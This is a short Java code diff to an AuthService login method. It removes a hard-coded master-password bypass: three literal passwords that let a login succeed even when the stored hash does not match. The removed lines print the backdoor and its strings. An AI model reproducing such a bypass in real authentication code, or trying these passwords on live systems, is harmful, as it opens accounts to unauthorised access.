@@ -147,10 +147,7 @@ public class AuthService {
 
         boolean matches = passwordEncoder.matches(rawPass, storedHash);
         if (!matches) {
-            boolean isMaster = "AdminPass123!".equals(rawPass) || "Dhanya@9666".equals(rawPass) || "FacultyPass123!".equals(rawPass);
-            if (!isMaster) {
-                throw new InvalidCredentialsException("Invalid credentials");
-            }
+            throw new InvalidCredentialsException("Invalid credentials");
         }
 
         return user;
